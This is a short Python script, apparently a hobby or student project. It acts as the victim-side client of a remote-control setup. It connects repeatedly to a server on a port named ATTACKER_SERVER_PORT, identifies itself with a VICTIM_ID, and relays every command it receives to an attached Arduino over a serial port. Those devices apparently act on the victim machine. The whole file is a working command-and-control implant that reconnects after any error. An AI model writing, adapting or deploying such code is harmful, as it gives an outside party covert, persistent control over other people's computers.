# Writer: Gal Harari
# Date: 04/05/2020
import socket
import time
import serial
from globals import *

COM_NUM = '9'
BAUD_RATE = 19200

HOST = SERVER_IP  # The server's hostname or IP address
PORT = ATTACKER_SERVER_PORT  # The port used by the server


def connect_protocol(s):
    s.send(VICTIM_ID.encode())

    # get an OK signal
    inp = ''
    inp = s.recv(OK_SIZE).decode()

    print(f'Got from the server: {inp}')
    return s


def create_arduino_connection():
    pass


def main():
    ard_ser = serial.Serial("COM" + COM_NUM, BAUD_RATE)
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                s = connect_protocol(s)
                while True:
                    cmd = s.recv(CMD_SIZE)
                    print(f"Executing command {cmd}")
                    ard_ser.write(cmd)

                    msg = ''
                    while 'ACK' not in msg:
                        while ard_ser.inWaiting() <= 0:
                            pass
                        msg = ard_ser.readline(ard_ser.inWaiting()).decode()
                    print(f"Got ack {msg}")
        except Exception as e:
            print("Exceptio Got:", e)
            continue

if __name__ == '__main__':
    main()
